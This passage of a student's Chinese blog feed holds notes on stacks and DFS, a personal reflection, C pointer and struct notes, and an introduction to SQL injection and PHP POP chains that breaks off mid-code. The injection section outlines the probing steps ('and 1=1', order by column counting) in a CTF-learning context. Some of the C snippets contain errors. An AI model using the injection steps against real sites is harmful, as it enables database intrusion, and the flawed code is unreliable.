所示。</p><p><img src="http://data.biancheng.net/uploads/allimg/220721/19231aB1-1.gif" alt="1"></p><p>由此我们可以对栈存储结构下一个定义：栈一种“只能从一端存取元素，且存取过程必须遵循‘先进后出’原则”的线性存储结构。</p><h4 id="栈的实际应用"><a href="#栈的实际应用" class="headerlink" title="栈的实际应用"></a>栈的实际应用</h4><ol><li>实现浏览器的“回退”功能<br>所谓浏览器的“回退”功能，比如您用浏览器打开 A 页面，然后从 A 页面跳转到 B 页面，然后再从 B 页面跳转到 C 页面。这种情况下，如果想回到 A 页面，有两种方法：<br>重新搜索找到 A 页面；<br>借助浏览器的“回退”功能，先从 C 页面回退到 B 页面，再从 B 页面回退到 A 页面。<br>很多浏览器的“回退”功能就位于工具栏中，图标是一个类似←的箭头。</li></ol><p>浏览器的“回退”功能底层就是用栈存储结构实现的，当从 A 页面跳转到 B 页面时，浏览器会执行入栈操作，A 页面信息会存入栈中；同样，从 B 页面跳转到 C 页面时，B 页面信息会存入栈中。当点击浏览器的“回退”按钮时，浏览器会执行“出栈”操作，根据“先进后出”的原则，B 页面先出栈，然后 A 页面出栈，这样就实现了“回退”的功能。</p><ol start="2"><li>实现 C 语言函数的相互调用<br>C语言程序中，函数间的相互调用过程也是用栈存储结构实现的。</li></ol><h4 id="栈的相关操作"><a href="#栈的相关操作" class="headerlink" title="栈的相关操作"></a>栈的相关操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stack</span>&lt;type&gt; s; 定义栈，type为数据类型，例如<span class="type">int</span>，<span class="type">float</span>，<span class="type">char</span>等</span><br><span class="line">s.push(item); 把item放到栈顶</span><br><span class="line">s.top() 返回栈顶的元素但不删除</span><br><span class="line">s.pop() 删除栈顶的元素但不返回</span><br><span class="line">s.empty()判断栈是否为空，若为空返回<span class="literal">true</span>否则返回<span class="literal">false</span></span><br><span class="line">s.size()返回栈中元素个数</span><br></pre></td></tr></table></figure><h4 id="Dijkstra双栈算术表达式"><a href="#Dijkstra双栈算术表达式" class="headerlink" title="Dijkstra双栈算术表达式"></a>Dijkstra双栈算术表达式</h4><p>( 1 + ( ( 2 + 3 ) * ( 4 * 5 ) ) )</p><p>算术表达式可能是一个数，或者是由一个左括号、一个算术表达式、一个运算符、另一个<br>算术表达式和一个右括号组成的表达式。简单起见，这里定义的是未省略括号的算术表达式，它明<br>确地说明了所有运算符的操作数</p><p>如何用程序计算如上低级算术表达式的值？</p><p>( 1 + ( ( 2 + 3 ) * ( 4 * 5 ) ) )<br>( 1 + ( 5 * ( 4 * 5 ) ) )<br>( 1 + ( 5 * 20 ) )<br>( 1 + 100 )<br>101</p><h4 id="深度优先搜索-Depth-First-Search-DFS"><a href="#深度优先搜索-Depth-First-Search-DFS" class="headerlink" title="深度优先搜索(Depth-First Search,DFS)"></a>深度优先搜索(Depth-First Search,DFS)</h4><p>深度优先搜索（Depth First Search），是图的一种搜索方式，以深度为优先级去进行搜索，用一句话概括就是：“一直往下走，走不通回头，换条路再走，直到无路可走”。具体算法描述为：<br>选择一个起始点 u 作为当前结点，执行如下操作：<br>a. 访问 当前结点，并且标记该结点已被访问，然后跳转到 b；<br>b. 如果存在一个和 当前结点 相邻并且尚未被访问的结点 v ，则将 v 设为当前结点，继续执行 a；<br>c. 如果不存在这样的 v ，则进行回溯，回溯的过程就是回退 当前结点；<br>上述所说的 当前结点 需要用一个栈来维护，每次访问到的结点入栈，回溯的时候出栈。除了栈，另一种实现深度优先搜索的方式是递归，代码更加简单，相对好理解。</p><p>我们刚才讲到树的遍历的思想其实就是DFS</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记5-反思</title>
      <link href="/2023/11/05/%E5%91%A8%E8%AE%B0-2023-11-05-%E5%91%A8%E8%AE%B05/"/>
      <url>/2023/11/05/%E5%91%A8%E8%AE%B0-2023-11-05-%E5%91%A8%E8%AE%B05/</url>
      
        <content type="html"><![CDATA[<h2 id="特别的一次周记"><a href="#特别的一次周记" class="headerlink" title="特别的一次周记"></a>特别的一次周记</h2><p>学习计算机也有一小段时间了,写一下最近的感悟吧,因为确实经历了一些事,调整一下最近的内容</p><p>最近经历了大大小小的考试和培训,学习了不少也感悟到了很多东西,但不得不说最近的新生赛和机试考核都没做出什么成绩,甚至说对于我来说很差劲,也确实有不小的挫败感,让我渐渐的怀疑自己了,但也明白了自己的基础差了不少</p><p>从最近也确实发现了,坚持是多么宝贵的精神,失败是多么的沉重,但我深知人不能轻言放弃,对于我来说,确实需要一些时间调整和反思,而且近期也思考了很多</p><p>之前也和学长或是同学聊过类似的事,现在看来我确实太急于求成了,对于学计算机的初心早已忘却,我依稀记得高考完的那个暑假,我收到了录取通知书,也坚定了我走计算机的道路,在不久的某一天半夜我心血来潮,第一次踏上了编程之路,满心欢喜的学上了Python这门语言并且真心的沉浸于此,那一晚不知不觉就学到了2点,跟着教程做出的小程序,当时的我确实很激动</p><p>在这之后按部就班的继续保持这份热情学习,并且我还记得在之后的那次新生闯关游戏拿了个名次,收获了意义非凡的奖品,但没想到那份骄傲和自豪到现在早已浑然不知,但失败的沉重却重重的对我施压,曾经的我对于精神内耗没有什么概念,现在也真正体会到了这种感觉</p><p>总体来说,学习这些没什么不好,但太急于求成与漂泊不定太容易迷失自我,现在的我开始做出一些调整了,散散心休息休息,想想自己该学些什么了,安排好自己的学习计划,对于摆烂这一块我还是拿手的哈哈,说真的坚持下去和坚定自我真的很难,可能我坐在屏幕前坦然自若的打字,但我感觉调整起来一点也不简单,希望我能笑到最后吧</p><p>然后本周也零零散散学到了一些东西,就不在此记录了,主要以反思为这篇周记的主题吧,继续努力</p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记5</title>
      <link href="/2023/10/29/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-29-%E7%AC%94%E8%AE%B05/"/>
      <url>/2023/10/29/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-29-%E7%AC%94%E8%AE%B05/</url>
      
        <content type="html"><![CDATA[<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><ul><li>基本用法</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> *p;  <span class="comment">//定义指针</span></span><br><span class="line">p=&amp;a;  <span class="comment">//指针指向a的地址</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,*p);  <span class="comment">//使用，解引用p得到a，*为还原指针指向的变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//用指针定义后，两者意义相同（p等价于&amp;a）</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,&amp;a); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,p); </span><br><span class="line"></span><br><span class="line"><span class="comment">//用指针定义后，两者意义相同（*p等价于a）再次用*即解引用</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,*p); </span><br><span class="line"></span><br><span class="line"><span class="comment">//可以通过指针直接访问指向对象的地址</span></span><br></pre></td></tr></table></figure><ul><li>意义：<em><strong>存储变量的地址</strong></em><br><em>指针地址为十六进制的值，如果以%d输出地址将转化为十进制输出</em><br>找到地址-&gt;依靠指针类型得到数据</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp=b;</span><br><span class="line">    b=a;</span><br><span class="line">    a=temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">swap(c,d)</span><br><span class="line"><span class="comment">/*函数中的参数传递方式是值传递，即将实参的值复制一份传递给形参，而不是传递实参的地址，因此在 swap 函数中修改的是形参 a 和 b 的值，不会影响到原始调用函数时传入的实参</span></span><br><span class="line"><span class="comment">（形参不能改变实参，a,b改变不会改变c,d的值）*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp = *b;</span><br><span class="line">    *b = *a;</span><br><span class="line">    *a = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">swap(&amp;c,&amp;d);</span><br><span class="line"><span class="comment">//使用指针，使形参可以更改实参的值（因为是直接将地址传递给形参）</span></span><br></pre></td></tr></table></figure><ul><li>指针做加减法：<em><strong>指针加减某个整数：指向前或向后偏移几个位置，使其指向前&#x2F;后几个位置</strong></em><br>***指针之间相减：得到两个指针之间间隔的元素数量，即偏移量（地址上相差几个位置）</li><li>打印指针的地址：***%p***（打印指针指向的对象是用对象的占位符，如整数就是%d）</li><li>多重指针：<em><strong>一个指针指向零一个指针</strong></em></li><li>指针数组：<em><strong>一个数组里储存的全是指针</strong></em></li><li>函数指针：写法int&#x2F;void (*p)() &#x3D; Func;</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Func</span><span class="params">()</span> &#123; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);   <span class="comment">//定义函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; </span><br><span class="line">    <span class="type">void</span> (*p)() = Func;   <span class="comment">// 定义函数指针（括号先解引用，再用于定义函数）</span></span><br><span class="line">    p();   <span class="comment">//可以通过函数指针直接调用函数 </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//函数指针需要与函数同一类型</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Func</span><span class="params">()</span> &#123;     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; </span><br><span class="line">    <span class="type">int</span> a;FunC</span><br><span class="line">    <span class="title function_">int</span> <span class="params">(*p)</span><span class="params">()</span> = FunC;   <span class="comment">//有返回值的也可以</span></span><br><span class="line">    a=p();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    &#125;    </span><br><span class="line"><span class="comment">//定义函数指针时括号内形参要与函数保持一致</span></span><br><span class="line"><span class="comment">//int (*p)(int a) = FunC; 等价于 int FunC(int a);</span></span><br><span class="line"><span class="comment">/*函数指针能够实现动态调用，通过改变指针的指向在不同阶段调用不同的函数（指针能够提高程序的效率，如函数名较长写清楚该段函数意义，而用一个简单的指针如p调用该函数，可以有效减少代码量）</span></span><br><span class="line"><span class="comment">//函数指针可以作为参数传递运用于复杂的函数嵌套</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">const int *p1 = a;  //指针指向的a是常量，不能通过指针修改a的值，只能访问a的值</span></span><br><span class="line"><span class="comment">int *const p2 = a;  //指针是常量，指向的地址不可变，a可以改变（即不可以重定义指针的指向）</span></span><br></pre></td></tr></table></figure><h3 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h3><ul><li>malloc在堆上分配内存，通过free手动回收内存</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//malloc语法写法（只能定义指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span>  <span class="comment">//malloc头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *ptr=(<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">4</span>);  <span class="comment">//括号内为分配的内存数，也可以写sizeof(int)就是4</span></span><br><span class="line"><span class="built_in">free</span>(ptr);  <span class="comment">//要与malloc成组搭配使用，防止内存泄漏</span></span><br><span class="line">*ptr = <span class="number">10</span>; *ptr = a;  <span class="comment">//可以正常指向变量</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *p = <span class="comment">//void是空，即可以指向任何类型，但无法被解引用</span></span><br><span class="line"><span class="type">int</span> *p = &amp;a  <span class="comment">//野指针：指向已经被销毁的变量</span></span><br></pre></td></tr></table></figure><ul><li>int a在栈上分配内存，生命周期结束后自动回收内存</li><li>生命周期：所在函数结束，大括号代表生命周期结束（全局变量会始终存在）<br><em>堆和栈都是内存中的区域</em></li><li>内存泄漏：用malloc分配后未释放，形成无用内存（影响程序运行）<br><em><strong>malloc记得和free成组搭配使用</strong></em></li></ul><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ul><li>内存布局：环境，栈，堆，未初始化数据段（BSS）和初始化数据段（DS）</li><li>字符串声明方式</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> t[] = <span class="string">&quot;Hello World&quot;</span>;  <span class="comment">//字符数组方式</span></span><br><span class="line"><span class="type">char</span> t* = <span class="string">&quot;Hello World&quot;</span>;   <span class="comment">//指针方式</span></span><br><span class="line"><span class="comment">//区别：指针方式是声明一个指向字符串（常量数组）的指针，不能通过指针改变字符串的内容</span></span><br></pre></td></tr></table></figure><ul><li>字符串输入方式</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%[^\n]&quot;</span>,str);</span><br><span class="line">gets(str);  <span class="comment">//已弃用，不安全（超过100会覆盖原有字符）</span></span><br><span class="line">fgets(str,<span class="number">100</span>,<span class="built_in">stdin</span>)  <span class="comment">//会把回车也读进去，最多储存100个字符，超出会截断（不再覆盖）</span></span><br></pre></td></tr></table></figure><ul><li>字符串输出方式</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="built_in">puts</span>(str);</span><br><span class="line"><span class="built_in">fputs</span>(str,<span class="built_in">stdout</span>);  <span class="comment">//stdin位标准输入，stdout为标准输入（std表示标准）</span></span><br></pre></td></tr></table></figure><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><ul><li>定义：一种数据结构，它由<em><strong>不同类型的数据</strong></em>组合成一个整体，以便引用，这些组合在一个整体中的数据是互相联系的，这样的数据结构称为<em><strong>结构体</strong></em></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span>  <span class="comment">//student为结构体名</span></span><br><span class="line">    <span class="type">char</span> *name;  <span class="comment">//结构体里也能定义指针</span></span><br><span class="line">    <span class="type">int</span> age;     <span class="comment">//大括号内为成员列表</span></span><br><span class="line">    <span class="type">double</span> score; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>定义类型typedef：<strong>为已有的数据类型定义一个新名字（类型别名）</strong> def意味define-定义</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> myint;  <span class="comment">//把int定义成myint（typedef为定义一个新类型：用已有类型定义）</span></span><br><span class="line">myint a = <span class="number">1</span>;        <span class="comment">//刺身就等价于int a = 1;</span></span><br><span class="line"><span class="comment">//也可以用typedef定义结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>  </span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">int</span> age;     </span><br><span class="line">    <span class="type">double</span> score; </span><br><span class="line">&#125; student;         <span class="comment">//这样每次声明变量前不用再写struct（把这一堆定义成student）</span></span><br><span class="line"></span><br><span class="line">student a;         <span class="comment">//定义类型student后这样写就行</span></span><br><span class="line">student b;         <span class="comment">//声名第2个同样的结构体</span></span><br></pre></td></tr></table></figure><ul><li>结构体初始化：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span>  </span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;     </span><br><span class="line">    <span class="type">double</span> score; </span><br><span class="line">&#125;a=&#123;<span class="string">&quot;ytm666&quot;</span>,<span class="number">114514</span>,<span class="number">1919.810</span>&#125;,b=&#123;<span class="string">&quot;hades&quot;</span>,<span class="number">222222</span>,<span class="number">52.886</span>&#125;;</span><br><span class="line"><span class="comment">//可以用逗号隔开，初始化2个结构体变量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">b</span>=</span>&#123;<span class="string">&quot;hades&quot;</span>,<span class="number">222222</span>,<span class="number">52.886</span>&#125;; </span><br><span class="line">是student，因此可省略<span class="class"><span class="keyword">struct</span></span></span><br></pre></td></tr></table></figure><ul><li>访问与修改结构体的值：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a.age=<span class="number">20</span>;  <span class="comment">//修改结构体的值</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a.age);  <span class="comment">//访问结构体的值</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span> =</span> &amp;a;  <span class="comment">//先定义指针</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,(*p).age);   <span class="comment">//加括号，先解引用，再加后缀）</span></span><br></pre></td></tr></table></figure><p>printf(“%d”,p-&gt;age);     &#x2F;&#x2F;指针第二两种写法（代表指针指向的值</p><ul><li>结构体只能存放变量，不可以定义函数，但我们可以在结构体中定义函数指针来调用不同函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>  </span><br><span class="line">    <span class="type">void</span> (*p)();          <span class="comment">//可以先定义，再指向函数</span></span><br><span class="line">    <span class="type">int</span> age;     </span><br><span class="line">    <span class="type">double</span> score; </span><br><span class="line">&#125; student; </span><br><span class="line"></span><br><span class="line">    student a=&#123;<span class="string">&quot;ytm666&quot;</span>,<span class="number">114514</span>,<span class="number">1919.810</span>&#125;;   </span><br><span class="line">    a.p() = Func1;  <span class="comment">//指向函数Func1（p经过指针定义*后，a.p意为指针指向函数Func1)</span></span><br><span class="line">    a.p() = Func2;  <span class="comment">//重新指向函数Func2</span></span><br></pre></td></tr></table></figure><ul><li>32位系统中4字节一组（存储一个地址），指针占4个字节； eg:<code>00 00 00 01</code></li><li>64位（当今）系统中8字节一组，指针占8个字节；eg:<code>00 00 04 01   00 00 04 02</code><br>（现在都是<em><strong>64位</strong></em>计算机，因此指针默认占<em><strong>8个字节</strong></em>）</li><li>结构体内存对齐规则:<br>1.第一个成员在与结构体变量偏移量为0的地址处 2.从第二个成员开始，以后每个成员都要对齐到某个对齐数的整数倍位置，这个对齐数是自身成员大小和默认成员对齐数的较小值 3.当成员全部放入后，结构体的总大小必须是所有成员对齐数（每个成员变量都有一个对齐数）中最大对齐数的整数倍</li></ul><pre><code class="c">typedef struct &#123;     char b;    int *a;    char c;    int e;&#125; student;- 对齐的意义：便于计算机访问，适配多种平台，提升运行速度</code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记4-SQL基础,pop链,php变量绑定</title>
      <link href="/2023/10/29/%E5%91%A8%E8%AE%B0-2023-10-29-%E5%91%A8%E8%AE%B04/"/>
      <url>/2023/10/29/%E5%91%A8%E8%AE%B0-2023-10-29-%E5%91%A8%E8%AE%B04/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h2><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>何为sql注入?简单来说就是攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作</p><p>例如对于一些安全性较低的登录页面,因为这些用户的数据都是存储在数据库中,那么就可以进行SQL注入来查询敏感信息或者做更多恶意操作</p><h3 id="mysql数据库结构"><a href="#mysql数据库结构" class="headerlink" title="mysql数据库结构"></a>mysql数据库结构</h3><p>mysql数据库5.0以上版本有一个自带的数据库叫做information_schema,该数据库下面有两个表一个是tables和columns。tables这个表的table_name字段下面是所有数据库存在的表名。table_schema字段下是所有表名对应的数据库名。columns这个表的colum_name字段下是所有数据库存在的字段名。columns_schema字段下是所有表名对应的数据库。了解这些对于我们之后去查询数据有很大帮助。</p><p>mysql数据库常用默认的端口为<strong>3306</strong></p><h3 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h3><p>在进行SQL注入之前,我们肯定要学习一下SQL语句,接下来介绍一些常用的语句和基本语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">启动运行mysql:</span><br><span class="line">在命令行输入mysql -u root -p后输入密码root</span><br><span class="line"></span><br><span class="line">基本规范:</span><br><span class="line">sql语句要在末尾加分号</span><br><span class="line">建议区分大小写(windows系统对大小写不敏感但Linux系统区分大小写)</span><br><span class="line">数据库基本结构为 数据库-&gt;表-&gt;列-&gt;单元</span><br><span class="line"></span><br><span class="line">数据库/表(若对表操作就把其中的database换成table):</span><br><span class="line">创建一个名为ytm666的数据库:create database ytm666;</span><br><span class="line">删除一个名为ytm666的数据库:drop database ytm666;</span><br><span class="line">使用一个名为ytm666的数据库:use ytm666;</span><br><span class="line">展示出服务器下的所有数据库:show databases;</span><br><span class="line"></span><br><span class="line">常用数据类型:</span><br><span class="line">int float double char和C语言同理,但有一个不同的是varchar即为长一点的字符串</span><br><span class="line"></span><br><span class="line">重要特性(赋给表中数据的特性):</span><br><span class="line">primary key 主键,唯一并且不能为空</span><br><span class="line">unique 唯一</span><br><span class="line">not null 不能为空</span><br><span class="line">auto_increment 自增</span><br><span class="line">* 此符号在sql语言中代表所有</span><br><span class="line"></span><br><span class="line">基本语句:</span><br><span class="line">use 一个数据库</span><br><span class="line">select 要查的数据 from 表名 where 列名 = 某个值; (查询数据:从xx表中查询xx列中的值)</span><br><span class="line">insert into 表名(列名1,列名2,...,列名n) values(值1,值2,...,值n); (向对应的列插入某个值)</span><br><span class="line">update 表名 set 列名1 = 某个值 where 列名2 = 某个值; (更新当列2时的列1值)</span><br><span class="line">delete from 表名 where 列名 = 某个值; (删除)</span><br><span class="line"></span><br><span class="line">重要的特殊字:</span><br><span class="line">%: 代表任意字符(类似于通配符)</span><br><span class="line">like: 例如select * from 列1 where 列2 like &#x27;%com&#x27;;(从列1获取所有列2中结尾为com时的数据,其中的列可以用xx表.xx列的形式代表某个表中的某列)</span><br><span class="line">union: 再来一句union前后的语句都起作用</span><br><span class="line">and 和 or: 字面意思</span><br><span class="line">order by: 以什么排序</span><br></pre></td></tr></table></figure><h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><p><img src="https://img-blog.csdnimg.cn/20201009142512180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ==,size_16,color_FFFFFF,t_70" alt="1"></p><ol><li>查找注入点</li><li>判断是字符型还是数字型(注入and 1&#x3D;1 1&#x3D;2 或者 3-1类似方式)</li><li>若是字符型,找到闭合方式</li><li>判断查询列数长短(group by 或者 order by)</li><li>查询回显位置(查询-1)</li></ol><h2 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h2><p>利用PHP中对象的自动调用魔术方法特性,将多个类和方法串联起来,形成一个链式调用.当PHP反序列化时,会自动调用这些方法,触发代码执行</p><p>而在此重点就是PHP中的魔术方法,正好总结下</p><p><img src="https://img-blog.csdnimg.cn/569baebce8af4d848e97b34cfc8130d1.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/112c8e398f6c44d0874c10fe2b08e79d.png" alt="1"></p><p>接下来通过一道ctf例题解析一下pop链的解法和思路</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 